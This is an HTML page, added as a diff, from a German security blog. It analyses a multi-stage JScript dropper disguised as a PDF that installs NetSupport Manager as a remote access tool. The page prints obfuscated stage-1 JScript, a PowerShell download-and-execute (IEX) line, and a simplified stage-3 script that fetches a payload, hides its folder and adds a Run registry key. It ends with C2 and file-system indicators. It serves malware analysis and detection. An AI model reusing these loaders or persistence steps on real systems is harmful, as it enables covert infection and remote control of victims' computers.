@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  
+    <title>JScript delivered RAT :: </title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="DISCLAIMER Das Herunterladen und ausführen von Malware, auch zum Zwecke der Analyse, ist gefährlich. Ich übernehme keinerlei Haftung für etwaige Schäden bei Nachahmung!
+UPDATE Neuere Varianten dieser Malware verteilen nicht direkt die jscript-Datei, sondern eine HTML-Datei, die im Javascript erst eine Zip mit dieser JScript-Datei baut! Einführung In diesem Blogeintrag möchte ich einen kleinen Einblick in die Analyse bzw. das reverse-eingineering von Malware geben. Hier anhand einer Beispielmalware, die über Mehrere Stufen letztendlich &amp;ldquo;NetSupport Manager&amp;rdquo; als Remote Access Tool (RAT) installiert." />
+<meta name="keywords" content="linux, it, consulting, security, hosting, development, jmbit, johannes bülow" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://www.jmbit.de/blog/2023-04-28-jsrat/" />
+
+
+  
+
+
+
+
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/buttons.min.2bc533403a27dfe0e93105a92502b42ce4587e2e4a87d9f7d349e51e16e09478.css">
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/code.min.00125962708925857e7b66dbc58391d55be1191a3d0ce2034de8c9cd2c481c36.css">
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/fonts.min.4881f0c525f3ce2a1864fb6e96676396cebe1e6fcef1933e8e1dde7041004fb5.css">
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/footer.min.2e3eb191baee58dd05a9f0104ac1fab0827bca7c64dafe0b2579f934c33a1d69.css">
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/header.min.b6fb4423cf82a9f9d7abc9cd010223fa3d70a6526a3f28f8e17d814c06e18f9e.css">
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/main.min.fe8dc560fccb53a458b0db19ccb7b265764ac46b68596b7e099c6793054dd457.css">
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/menu.min.83637a90d903026bc280d3f82f96ceb06c5fc72b7c1a8d686afb5bbf818a29f7.css">
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/pagination.min.82f6400eae7c7c6dc3c866733c2ec0579e4089608fea69400ff85b3880aa0d3c.css">
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/post.min.fc74ca360273c1d828da3c02b8174eba435607b369d98418ccc6f2243cd4e75d.css">
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/prism.min.9023bbc24533d09e97a51a0a42a5a7bfe4c591ae167c5551fb1d2191d11977c0.css">
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/syntax.min.cc789ed9377260d7949ea4c18781fc58959a89287210fe4edbff44ebfc1511b6.css">
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/terminal.min.dd0bf9c7cacb24c1b0184f52f1869b274e06689557468cc7030ccf632328eb97.css">
+
+  
+  <link rel="stylesheet" href="https://www.jmbit.de/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="https://www.jmbit.de/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="https://www.jmbit.de/favicon.png">
+<link rel="apple-touch-icon" href="https://www.jmbit.de/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="de" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="JScript delivered RAT">
+<meta property="og:description" content="DISCLAIMER Das Herunterladen und ausführen von Malware, auch zum Zwecke der Analyse, ist gefährlich. Ich übernehme keinerlei Haftung für etwaige Schäden bei Nachahmung!
+UPDATE Neuere Varianten dieser Malware verteilen nicht direkt die jscript-Datei, sondern eine HTML-Datei, die im Javascript erst eine Zip mit dieser JScript-Datei baut! Einführung In diesem Blogeintrag möchte ich einen kleinen Einblick in die Analyse bzw. das reverse-eingineering von Malware geben. Hier anhand einer Beispielmalware, die über Mehrere Stufen letztendlich &amp;ldquo;NetSupport Manager&amp;rdquo; als Remote Access Tool (RAT) installiert." />
+<meta property="og:url" content="https://www.jmbit.de/blog/2023-04-28-jsrat/" />
+<meta property="og:site_name" content="" />
+
+  <meta property="og:image" content="https://www.jmbit.de/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-04-28 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    JMB IT
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/blog/">Blog</a></li>
+        
+      
+        
+          <li><a href="/about/">Über mich</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/blog/" >Blog</a></li>
+        
+      
+        
+          <li><a href="/about/" >Über mich</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://www.jmbit.de/blog/2023-04-28-jsrat/">JScript delivered RAT</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-04-28</time></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="disclaimer"><em>DISCLAIMER</em><a href="#disclaimer" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><strong>Das Herunterladen und ausführen von Malware, auch zum Zwecke der Analyse, ist gefährlich. Ich übernehme
+keinerlei Haftung für etwaige Schäden bei Nachahmung!</strong></p>
+<table>
+<thead>
+<tr>
+<th>UPDATE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Neuere Varianten dieser Malware verteilen nicht direkt die jscript-Datei, sondern eine HTML-Datei, die im Javascript erst eine Zip mit dieser JScript-Datei baut!</td>
+</tr>
+</tbody>
+</table>
+<h2 id="einführung">Einführung<a href="#einführung" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>In diesem Blogeintrag möchte ich einen kleinen Einblick in die Analyse bzw. das reverse-eingineering von Malware geben.
+Hier anhand einer Beispielmalware, die über Mehrere Stufen letztendlich &ldquo;NetSupport Manager&rdquo; als Remote Access Tool
+(RAT) installiert.</p>
+<p>Auf den ersten Blick scheint die Datei vergleichsweise harmlos, insbesondere wenn man z.B. in Windows nicht aktiviert
+hat, dass der Dateiname vollständig (inkl. Endung) angezeigt wird.
+<img alt="Screenshot der Dateivorschau" src="/img/blog/Screenshot_from_2023-04_28-08-50-24.png"></p>
+<p>Sollte ein Windows-User die Datei zum öffnen Doppelklicken, wird sie, statt wie zu erwarten im konfigurierten PDF-Viewer
+angezeigt zu werden, vom <a href="https://de.wikipedia.org/wiki/Windows_Script_Host">Windows Script Host</a> mithilfe dessen
+JScript-Engine ausgeführt.</p>
+<h2 id="stage-1">Stage 1<a href="#stage-1" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Die initial heruntergeladene Datei ist sehr stark <a href="https://de.wikipedia.org/wiki/Obfuskation">Obfuscated</a>, was das
+Reverse engineering deutlich erschwert. Ein relativ einfacher Trick ist hier jedoch, die eigentlichen Aufrufe, die die
+nächste Stage herunterladen wollen, so umzubauen, dass sie statt dem eigentlichen Aufruf jediglich den entsprechenden
+Code ausgeben:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">LRVydqTXzFWJIfh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">l</span>(<span style="color:#ae81ff">0x46</span>, <span style="color:#e6db74">&#39;psLt&#39;</span>), <span style="color:#a6e22e">PoHdrRpqKNwXVGyEDMO</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">V0</span>(<span style="color:#ae81ff">0x12</span>, <span style="color:#e6db74">&#39;J7Hu&#39;</span>), <span style="color:#a6e22e">CkMPuJXlbEaniIF</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#a6e22e">LRVydqTXzFWJIfh</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.APPlIcatioN&#39;</span>), <span style="color:#a6e22e">FNwMBmgDjPdaInUxO</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#a6e22e">V1</span>(<span style="color:#ae81ff">0x3a</span>, <span style="color:#e6db74">&#39;3NAk&#39;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">FNwMBmgDjPdaInUxO</span>[<span style="color:#a6e22e">V1</span>(<span style="color:#ae81ff">0x39</span>, <span style="color:#e6db74">&#39;bmzj&#39;</span>)](<span style="color:#a6e22e">V3</span>(<span style="color:#ae81ff">0x85</span>, <span style="color:#e6db74">&#39;KWPY&#39;</span>)) <span style="color:#f92672">==</span> <span style="color:#f92672">!</span>[] <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">CkMPuJXlbEaniIF</span>[<span style="color:#a6e22e">V3</span>(<span style="color:#ae81ff">0xac</span>, <span style="color:#e6db74">&#39;ClZu&#39;</span>)](<span style="color:#a6e22e">PoHdrRpqKNwXVGyEDMO</span>, <span style="color:#a6e22e">V5</span>(<span style="color:#ae81ff">0xbb</span>, <span style="color:#e6db74">&#39;^B7D&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">LRVydqTXzFWJIfh</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V0</span>(<span style="color:#ae81ff">0x14</span>, <span style="color:#e6db74">&#39;O7y)&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">V3</span>(<span style="color:#ae81ff">0x8f</span>, <span style="color:#e6db74">&#39;EFHx&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">V5</span>(<span style="color:#ae81ff">0x87</span>, <span style="color:#e6db74">&#39;xnQ2&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;kAG8AdwBuAGwAb&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V0</span>(<span style="color:#ae81ff">0x4b</span>, <span style="color:#e6db74">&#39;$gV2&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">l</span>(<span style="color:#ae81ff">0x9d</span>, <span style="color:#e6db74">&#39;t[sl&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;0AH&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V1</span>(<span style="color:#ae81ff">0x3</span>, <span style="color:#e6db74">&#39;T1lY&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;dAB0AHAAcw&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V1</span>(<span style="color:#ae81ff">0x27</span>, <span style="color:#e6db74">&#39;K!KR&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">V3</span>(<span style="color:#ae81ff">0x22</span>, <span style="color:#e6db74">&#39;0N#q&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">V4</span>(<span style="color:#ae81ff">0x9e</span>, <span style="color:#e6db74">&#39;3ZuB&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;AGgAcwB1AHAAcABsAHkAdQBzAC4AYwBvAG0&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V3</span>(<span style="color:#ae81ff">0x48</span>, <span style="color:#e6db74">&#39;s#8T&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;BsAG8AYwBhAGwAc&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V5</span>(<span style="color:#ae81ff">0x2c</span>, <span style="color:#e6db74">&#39;YL@E&#39;</span>), <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#a6e22e">V3</span>(<span style="color:#ae81ff">0x71</span>, <span style="color:#e6db74">&#39;l!tn&#39;</span>), <span style="color:#ae81ff">0x0</span>);
+</span></span></code></pre></div><p><em>Hier erstellt die Malware ein ActiveXObjekt mit der nächsten Stufe und führt diese aus.</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">LRVydqTXzFWJIfh</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">l</span>(<span style="color:#ae81ff">0x46</span>, <span style="color:#e6db74">&#39;psLt&#39;</span>), <span style="color:#a6e22e">PoHdrRpqKNwXVGyEDMO</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">V0</span>(<span style="color:#ae81ff">0x12</span>, <span style="color:#e6db74">&#39;J7Hu&#39;</span>), <span style="color:#a6e22e">CkMPuJXlbEaniIF</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#a6e22e">LRVydqTXzFWJIfh</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;.APPlIcatioN&#39;</span>), <span style="color:#a6e22e">FNwMBmgDjPdaInUxO</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#a6e22e">V1</span>(<span style="color:#ae81ff">0x3a</span>, <span style="color:#e6db74">&#39;3NAk&#39;</span>));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">FNwMBmgDjPdaInUxO</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V1</span>(<span style="color:#ae81ff">0x39</span>, <span style="color:#e6db74">&#39;bmzj&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">V3</span>(<span style="color:#ae81ff">0x85</span>, <span style="color:#e6db74">&#39;KWPY&#39;</span>)) ;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">CkMPuJXlbEaniIF</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V3</span>(<span style="color:#ae81ff">0xac</span>, <span style="color:#e6db74">&#39;ClZu&#39;</span>) )
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">PoHdrRpqKNwXVGyEDMO</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V5</span>(<span style="color:#ae81ff">0xbb</span>, <span style="color:#e6db74">&#39;^B7D&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">LRVydqTXzFWJIfh</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V0</span>(<span style="color:#ae81ff">0x14</span>, <span style="color:#e6db74">&#39;O7y)&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">V3</span>(<span style="color:#ae81ff">0x8f</span>, <span style="color:#e6db74">&#39;EFHx&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">V5</span>(<span style="color:#ae81ff">0x87</span>, <span style="color:#e6db74">&#39;xnQ2&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;kAG8AdwBuAGwAb&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V0</span>(<span style="color:#ae81ff">0x4b</span>, <span style="color:#e6db74">&#39;$gV2&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">l</span>(<span style="color:#ae81ff">0x9d</span>, <span style="color:#e6db74">&#39;t[sl&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;0AH&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V1</span>(<span style="color:#ae81ff">0x3</span>, <span style="color:#e6db74">&#39;T1lY&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;dAB0AHAAcw&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V1</span>(<span style="color:#ae81ff">0x27</span>, <span style="color:#e6db74">&#39;K!KR&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">V3</span>(<span style="color:#ae81ff">0x22</span>, <span style="color:#e6db74">&#39;0N#q&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">V4</span>(<span style="color:#ae81ff">0x9e</span>, <span style="color:#e6db74">&#39;3ZuB&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;AGgAcwB1AHAAcABsAHkAdQBzAC4AYwBvAG0&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V3</span>(<span style="color:#ae81ff">0x48</span>, <span style="color:#e6db74">&#39;s#8T&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;BsAG8AYwBhAGwAc&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">V5</span>(<span style="color:#ae81ff">0x2c</span>, <span style="color:#e6db74">&#39;YL@E&#39;</span>), <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#a6e22e">V3</span>(<span style="color:#ae81ff">0x71</span>, <span style="color:#e6db74">&#39;l!tn&#39;</span>), <span style="color:#ae81ff">0x0</span>);
+</span></span></code></pre></div><p><em>Der gleiche Teil des Codes, aber entschärft und mit print-Statements. Das &ldquo;ActiveXObject&rdquo; ist jetzt eine einfache
+Klasse mit String dahinter.</em></p>
+<p>Wenn man diesen Code dann mithilfe von NodeJS ausführt, erhält  man den folgenden Output:</p>
+<pre tabindex="0"><code>remnux@remnux:~/Analysis/nitrogen-diet-florida-monkey$ node nitrogen-diet-florida-monkey.js
+ShElL.APPlIcatioN
+scriptIng.fIlesysTemobjeCt
+[object Object]FolderExistsC:\userss
+[object Object]ShellExecute
+cmd/C POwerShElL -nop -w hidden -ep bypass -enc &lt;BASE64String&gt;  oPen 0
+</code></pre><p>der Base64 kodierte String enthält diesen Powershellbefehl, der die nächste Stufe der Malware herunterlädt.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>IEX (New-Object Net.Webclient).downloadstring(<span style="color:#e6db74">&#34;&lt;STAGE3URL&gt;&#34;</span>)
+</span></span></code></pre></div><h2 id="stage-3">Stage 3<a href="#stage-3" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Stufe 3 der Malware ist ein Powershell-Skript, das auch wieder obfuskiert ist, z.B. durch seltsame Groß/Kleinschreibung,
+String-Formatierung und großzügig verteilten `, die in Powershell als Escape verwendet werden (im Gegensatz zu den
+meisten anderen Sprachen, die \ verwenden). Zudem wurde der gesamte Code in eine Zeile geschrieben.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>{rn`UM}=&amp;(<span style="color:#e6db74">&#34;{2}{0}{1}&#34;</span><span style="color:#f92672">-f</span> <span style="color:#e6db74">&#39;and&#39;</span>,<span style="color:#e6db74">&#39;om&#39;</span>,<span style="color:#e6db74">&#39;Get-R&#39;</span>) -minimum <span style="color:#ae81ff">5</span> -maximum <span style="color:#ae81ff">9</span>; ${r`Rn`UM}=&amp;(<span style="color:#e6db74">&#34;{3}{2}{0}{1}&#34;</span><span style="color:#f92672">-f</span> <span style="color:#e6db74">&#39;Rand&#39;</span>,<span style="color:#e6db74">&#39;om&#39;</span>,<span style="color:#e6db74">&#39;-&#39;</span>,<span style="color:#e6db74">&#39;Get&#39;</span>) -minimum <span style="color:#ae81ff">1024</span> -maximum <span style="color:#ae81ff">9999</span>; ${CH`Rs}=(<span style="color:#e6db74">&#34;{8}{9}{6}{2}{10}{11}{12}{0}{14}{4}{13}{5}{3}{7}{1}&#34;</span> <span style="color:#f92672">-f</span> <span style="color:#e6db74">&#39;D&#39;</span>,<span style="color:#e6db74">&#39;PRSTUVWXYZ&#39;</span>,<span style="color:#e6db74">&#39;pstuvw&#39;</span>,<span style="color:#e6db74">&#39;KLM&#39;</span>,<span style="color:#e6db74">&#39;F&#39;</span>,<span style="color:#e6db74">&#39;J&#39;</span>,<span style="color:#e6db74">&#39;mno&#39;</span>,<span style="color:#e6db74">&#39;NO&#39;</span>,<span style="color:#e6db74">&#39;abcdefghi&#39;</span>,<span style="color:#e6db74">&#39;jkl&#39;</span>,<span style="color:#e6db74">&#39;x&#39;</span>,<span style="color:#e6db74">&#39;yz&#39;</span>,<span style="color:#e6db74">&#39;ABC&#39;</span>,<span style="color:#e6db74">&#39;GHI&#39;</span>,<span style="color:#e6db74">&#39;E&#39;</span>); ${R`STR}=<span style="color:#e6db74">&#39;&#39;</span>; ${r`An}=.(<span style="color:#e6db74">&#34;{0}{1}{2}{3}&#34;</span> <span style="color:#f92672">-f</span><span style="color:#e6db74">&#39;New-O&#39;</span>,<span style="color:#e6db74">&#39;bje&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span>,<span style="color:#e6db74">&#39;t&#39;</span>) (<span style="color:#e6db74">&#34;{1}{0}{3}{2}&#34;</span><span style="color:#f92672">-f</span> <span style="color:#e6db74">&#39;m.Ra&#39;</span>,<span style="color:#e6db74">&#39;Syste&#39;</span>,<span style="color:#e6db74">&#39;m&#39;</span>,<span style="color:#e6db74">&#39;ndo&#39;</span>);
+</span></span></code></pre></div><p><em>Ausschnitt aus dem Originalcode</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env pwsh</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&amp;(<span style="color:#e6db74">&#39;cd&#39;</span>) ${ENV<span style="color:#960050;background-color:#1e0010">:</span>appdata}
+</span></span><span style="display:flex;"><span>${link} = <span style="color:#e6db74">&#34;https://&lt;payloadurl&gt;/wp-content/plugins/giveme.php&#34;</span>
+</span></span><span style="display:flex;"><span>${rnum} = <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>${rrnum} = <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>${chrs} = <span style="color:#e6db74">&#34;abcdefghijklmnopstuvwxyzABCDEFGHIJKLMNOPRSTUVWXYZ&#34;</span>
+</span></span><span style="display:flex;"><span>${rstr} = <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>${ran} = .(New-Object System.Random)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (${i} = <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    ${i} <span style="color:#f92672">-lt</span> ${r`NuM}
+</span></span><span style="display:flex;"><span>    ${I}++) { ${rstr} += ${chrs}[${ran}.next.Invoke(<span style="color:#ae81ff">0</span>, ${chrs}.<span style="color:#e6db74">&#34;length&#34;</span>)] }
+</span></span><span style="display:flex;"><span>${rzip} = ${rstr} + <span style="color:#e6db74">&#34;.zip&#34;</span>
+</span></span><span style="display:flex;"><span>${path} = ${ENV<span style="color:#960050;background-color:#1e0010">:</span>`APPDATA} + <span style="color:#e6db74">&#39;\&#39;</span> + ${rzip}
+</span></span><span style="display:flex;"><span>${pzip} = ${ENV<span style="color:#960050;background-color:#1e0010">:</span> APPDATA} + <span style="color:#e6db74">&#34;\ONEN0TEupdate_&#34;</span>
+</span></span><span style="display:flex;"><span>write-host (Start-Bitstransfer) -Source ${link} -Destination ${path}
+</span></span><span style="display:flex;"><span>&amp;(Expand-Archive -path ${path} -destinationpath ${pzip})
+</span></span><span style="display:flex;"><span>${fold} = &amp;(Get-Item) ${pzip} -Force
+</span></span><span style="display:flex;"><span>${fold}.Attributes = Hidden
+</span></span><span style="display:flex;"><span>&amp;(Remove-Item) -path ${path}
+</span></span><span style="display:flex;"><span>&amp;(<span style="color:#e6db74">&#39;cd&#39;</span>) ${pzip}
+</span></span><span style="display:flex;"><span>Write-Output Start client32.exe
+</span></span><span style="display:flex;"><span>${fstr} = ${ENV<span style="color:#960050;background-color:#1e0010">:</span>appdata} + <span style="color:#e6db74">&#34;.\ONEN0TEupdate_1337\client32.exe&#34;</span>
+</span></span><span style="display:flex;"><span>${rnm} = ONEN0TEupdate_1337
+</span></span><span style="display:flex;"><span>Write-Output New-ItemProperty -Path HKCU<span style="color:#960050;background-color:#1e0010">:</span>\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name ONEN0TEupdate_1337 -Value ${fstr}  -PropertyType String
+</span></span></code></pre></div><p><em>Stage3, aufgeräumt und vereinfacht</em></p>
+<p>Stufe 3 ist die Stufe, die letztendlich die eigentliche Payload herunterlädt. sowie einen Autostart-Registrykey
+erstellt.
+Bei der Payload handelt es sich um eine vorkonfigurierte Version von NetSupport Manager, die sich mit dem C2-Server
+verbindet.</p>
+<h2 id="iocs">IOCs<a href="#iocs" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="c2-server">C2-Server<a href="#c2-server" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>blahadfurtik.com:5222 (IP: 89.22.237.94 )</li>
+</ul>
+<h3 id="lokalfilesystem">Lokal/Filesystem<a href="#lokalfilesystem" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>Ordner mit dem Namen &ldquo;ONEN0TEupdate_XXXX&rdquo; in <code>C:/Users/&lt;USER&gt;/AppData/Roaming/</code></li>
+<li>Registry-Key unter <code>HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code> mit dem gleichen Namen wie der Ordner in
+Appdata und zu client32.exe in diesem zeigend</li>
+</ul>
+<hr>
+<p>Verwendetes Sample: SHA256:00d87e984f0fcd2e8fb55e4b83d86027dac67fd073958a95cbc98961ab940f4b
+Quelle: bazaar.abuse.ch</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Weitere Artikel</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="https://www.jmbit.de/blog/2023-08-28-html-bypass-filters/" class="button inline prev">
+        Umgehen von Content Filtering, Proxies und Antivirus mit HTML Dateien
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="https://www.jmbit.de/blog/2023-02-05-esxiargs/" class="button inline next">
+        ESXiArgs
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Johannes Bülow :: Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span> :: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+        <span> :: <a href="/impressum/index.html">Impressum</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
